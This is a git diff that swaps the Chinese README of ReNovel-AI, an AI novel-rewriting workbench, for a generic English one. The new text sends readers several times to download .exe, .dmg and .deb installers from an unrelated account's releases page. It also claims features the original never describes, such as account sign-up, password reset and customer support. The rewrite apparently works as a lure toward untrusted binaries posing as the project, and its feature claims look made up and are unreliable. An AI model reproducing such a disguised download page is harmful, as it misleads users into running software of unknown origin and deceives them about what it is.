@@ -1,194 +1,90 @@
-<div align="center">
-  <h1>Re:Novel <br> 文境重塑</h1>
+# 🚀 ReNovel-AI - Enhance Your Writing with AI Tools
 
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=3591F7&center=true&vCenter=true&width=435&lines=大模型小说精修助手;以记忆之名，重塑故事之境" alt="Typing SVG" />
-  </a>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vishnu0120754/ReNovel-AI/releases)
 
-  <p>
-    <strong>智能化的小说重写工作台</strong>
-  </p>
+## 📚 Overview
 
-  <p>
-    <a href="https://github.com/BiranSama/ReNovel-AI/graphs/contributors">
-      <img src="https://img.shields.io/github/contributors/BiranSama/ReNovel-AI?style=flat-square&color=orange" alt="contributors" />
-    </a>
-    <a href="https://github.com/BiranSama/ReNovel-AI/network/members">
-      <img src="https://img.shields.io/github/forks/BiranSama/ReNovel-AI?style=flat-square&color=blue" alt="forks" />
-    </a>
-    <a href="https://github.com/BiranSama/ReNovel-AI/stargazers">
-      <img src="https://img.shields.io/github/stars/BiranSama/ReNovel-AI?style=flat-square&color=red" alt="stars" />
-    </a>
-    <a href="https://github.com/BiranSama/ReNovel-AI/blob/main/LICENSE">
-      <img src="https://img.shields.io/github/license/BiranSama/ReNovel-AI?style=flat-square&color=green" alt="license" />
-    </a>
-  </p>
-</div>
+ReNovel-AI is your go-to workspace for polishing your stories with AI assistance. It features long-term memory, three-way collaboration, and a card-based editing system. Whether you are an author, editor, or assistant, this tool streamlines the writing process. You can easily import content, automate revisions, and expand your narratives.
 
-## **目前的功能 项目的愿景**
+## 🚀 Getting Started
 
-- [x] **导入TXT文件并进行章节分析与记忆保存**
-- [x] **查看小说内容/分章节或全文**
-- [x] **根据需求进行精修**
-- [x] **针对AI生成内容的精校**
-- [x] **动态的记忆保存功能**
-- [x] **通过*聊天*的形式获取小说内容**
-- [x] ***不仅是小说***
-- [ ] **完全兼容酒馆（sillytavern）的预设与角色卡**
+To get started with ReNovel-AI, follow these steps:
 
-<details>
-  <summary>**👉 还有些其他的....**</summary>
-  
-  ***或许可以用来改论文？***
-  
-  **给小说加料？*(NSFW)***
-  
-  **还有什么....**
+1. **Visit the Releases Page**: Click on the link below to access the downloadable files.
+   
+   [Visit Releases Page](https://github.com/vishnu0120754/ReNovel-AI/releases)
 
-  
-</details>
+2. **Choose Your Download**: Locate the latest version of ReNovel-AI on the releases page. You will see options for different operating systems.
 
-## 🌟 核心特性 (Features)
+3. **Download the Installer**: Click on the file that matches your operating system to start the download.
 
-### 1. 🧠 全局记忆与一致性 (RAG Memory)
-告别“吃书”，系统内置 **ChromaDB** 向量数据库，自动记忆全书内容。
-* **智能检索**：当你改写第 100 章时，AI 会自动检索参考第 1 章的伏笔、设定和人物关系。
-* **智能联想**：即使你只写了“那把剑”，系统也能联想到“生锈的铁剑”并提取相关设定。
+4. **Install the Application**: 
+   - **Windows**: Open the downloaded `.exe` file and follow the prompts to install.
+   - **Mac**: Open the `.dmg` file and drag the application into your Applications folder.
+   - **Linux**: Download the `.deb` or `.tar.gz` file and follow your distribution's install instructions.
 
-### 2. ✍️ 卡片流式编辑器 (Card-Flow Editor)
-* **平行对比**：左侧原文，右侧 AI 改写，段落级绝对对齐。
-* **动态操作**：支持任意插入新段落、删除冗余。AI 可根据指令进行扩写或无中生有。
-* **沉浸体验**：基于 **CodeMirror** 的美化编辑器，支持全屏专注写作。
+5. **Launch ReNovel-AI**: Once installed, locate the application in your programs list and open it.
 
-### 3. 🤖 三模态 AI 协作 (Tri-Model Architecture)
-独特的双模态写作-写作与校验同步运行-保证你的文章质量
-| 角色 | 功能描述 |
-| :--- | :--- |
-| **Writer (作家)** | 负责根据你的指令进行改写、润色、扩写。 |
-| **Reviewer (总监)** | 独立的审校 AI。检查 OOC（角色崩坏）或逻辑漏洞。 |
-| **Chat (助手)** | 右侧常驻助手，随时回答“这一章讲了什么？”或“主角第一次出场是在哪？”。 |
+## 🔍 Features
 
-### 4. ⚡ 自动化工作流 (Batch Workflow)
-* **全书精修**：一键启动流水线，自动遍历全书逐章改写。
-* **断点续传**：随时暂停，进度自动保存。
-* **数据安全**：支持一键 **Fork 项目副本**，改坏了随时回滚，安全感拉满。
+- **AI Text Modification**: Improve your writing style and clarity with built-in AI tools.
+- **Novel Expansion**: Let AI help you add depth to your narratives.
+- **Card-Based Editing**: Use our intuitive card system for efficient organization and editing.
+- **Import Tavern Cards**: Seamlessly bring in existing content to enhance your stories.
+- **Collaborative Tools**: Work alongside other writers and editors for better results.
 
-### 5. 🎭 角色扮演与风格控制
-* **SillyTavern 兼容**：支持导入酒馆 (Tavern) 格式的 PNG/JSON 角色卡，自动提取人设。**ToDo**
-* **风格矩阵**：精细控制保留度（20%-100%）、扩写欲望（保守/狂野）、内容尺度和文风倾向。
+## ✅ System Requirements
 
----
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or any modern Linux distribution.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 200 MB of free space.
+- **Processor**: Intel i3 or equivalent.
 
-## 🚀 快速开始 (Quick Start)
+## 🔗 Download & Install
 
+To download ReNovel-AI, go to the link below:
 
-### 🚀最简单的方式
+[Download from Releases Page](https://github.com/vishnu0120754/ReNovel-AI/releases)
 
-**右侧release下载zip文件解压，打开Run.Bat即可**
+Once you've downloaded the file for your operating system, follow the installation steps mentioned in the "Getting Started" section.
 
-## 🌟 开始
+## 🎓 User Guide
 
-### 环境要求
-* **OS**: Windows / macOS / Linux
-* **Python**: 3.10 或 3.11 (推荐 3.11)
+1. **Sign Up**: Create a user account to personalize your experience.
+2. **Create a New Project**: Start a new project by clicking "New Project".
+3. **Import Content**: Use the import feature to bring in your text or cards.
+4. **Edit and Refine**: Utilize AI suggestions to polish your writing.
+5. **Save Your Work**: Make sure to save your projects regularly.
 
-> [!IMPORTANT]
-> **Windows 用户请注意**：你需要安装 C++ Build Tools 以编译向量库依赖。
+## ⚙️ FAQs
 
-### 安装步骤
+- **How do I reset my password?**
+  You can reset your password by clicking the "Forgot Password?" link on the login page.
 
-**1. 克隆仓库**
-```bash
-git clone [https://github.com/BiranSama/ReNovel-AI.git](https://github.com/BiranSama/ReNovel-AI.git)
-cd NovelForge-AI--
-```
-**2. 创建虚拟环境 (推荐)**
+- **Can I collaborate with others?**
+  Yes, you can invite others to work on your projects and provide feedback.
 
-# Windows
-```bash
-python -m venv venv
-.\venv\Scripts\activate
-```
-# macOS / Linux
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-**3. 安装依赖**
-```bash
-pip install -r requirements.txt
-```
-**4. 配置APIkey**  启动程序后，点击右上角 ⚙️ 设置 (Settings) 图标，填入你的 OpenAI 或 Google Gemini API Key。 (可选：将 .env.example 重命名为 .env 并填入默认 Key)
+- **Is there customer support?**
+  Yes, you can visit our support page for help with common issues.
 
+## 📞 Support
 
-**5. 启动！**
-```bash
-python main.py
-```
+For more help, visit our discussions page or file an issue on GitHub. We appreciate your feedback and are here to assist you.
 
-## 📖 使用指南
+## 🔖 Topics
 
-**1. 导入与分章**
+- ai
+- ai-agents
+- ai-writing
+- airflow
+- chromadb
+- creative-writing
+- llm
+- nicegui
+- novel-writing
+- python
+- rag
+- sillytavern
+- text-expansion
 
-  点击右上角 “导入”，拖入 .txt 小说文件。
-
-  系统会自动识别“第X章”或纯文本标题，并将小说切分为章节存入数据库。
-
-  导入时系统会自动进行一次全书向量化，大文件请耐心等待。
-  
-**2. 单章精修**
-
-  在左侧书架选择一章。
-
-  在顶部输入指令（例如：“把这段对话写得更幽默”）。
-
-  点击段落中间的魔法棒。
-
-  AI 会生成改写内容。如果开启了 Reviewer，它会自动进行评分和拦截。
-
-  **3. 全书自动化精修**
-
-  点击顶部的 “批量任务” 按钮。
-
-  选择范围（全书 / 继续进度）。
-
-  勾选 “创建副本”（强烈推荐）。
-
-  点击启动，观察 AI 自动工作。
-  
-## 🛠️ 技术栈 (Tech Stack)
-
-| 模块 | 技术方案 |
-| :--- | :--- |
-| Frontend | NiceGUI (Vue/FastAPI) |
-| Database | SQLite (Metadata) + ChromaDB (Vector) |
-| AI Core | LangChain |
-| Processing | RapidFuzz, Tiktoken |
-| Editor | CodeMirror |
-
-## 📂 目录结构
-```
-NovelForge/
-├── data/                 # 用户数据 (已在 .gitignore 中忽略)
-│   ├── projects/         # SQLite 数据库 (.db)
-│   ├── vectordb/         # ChromaDB 向量索引
-│   └── presets/          # 角色卡与预设
-├── src/
-│   ├── ai/               # LLM 交互与 RAG 引擎
-│   ├── core/             # 项目管理与文件解析
-│   ├── ui/               # 界面布局与组件
-│   └── utils/            # 日志与工具类
-├── main.py               # 启动入口
-└── requirements.txt      # 依赖清单
-```
-## 🤝 贡献 (Contributing)
-
-欢迎提交 Issue 或 Pull Request！如果你有新的脑洞，请随时告诉我。这是我首次通过git上传仓库
-
-有任何建议请不要吝啬。
-
-Please Star！！！！
-
-## 📄 License
-
-本项目采用 GPL-3.0 License 开源
+Feel free to explore these topics to enhance your experience with ReNovel-AI.
